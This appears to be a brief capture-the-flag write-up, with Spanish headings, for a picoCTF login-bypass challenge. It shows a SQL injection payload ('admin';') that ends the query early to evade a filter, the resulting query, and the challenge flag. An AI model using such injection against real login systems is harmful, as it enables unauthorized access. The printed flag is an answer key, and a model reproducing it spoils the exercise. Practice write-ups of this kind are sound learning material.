## Objetivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or

## Datos de Acceso al Nivel

([link](https://jupiter.challenges.picoctf.org/problem/52849/))
## Solucion

```
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
```

## Notas Adicionales

el sitio tenia un detector de intyeccion sql por lo que en el admin se pone un ' y un ; para hacer que termine la consulta

## Referencias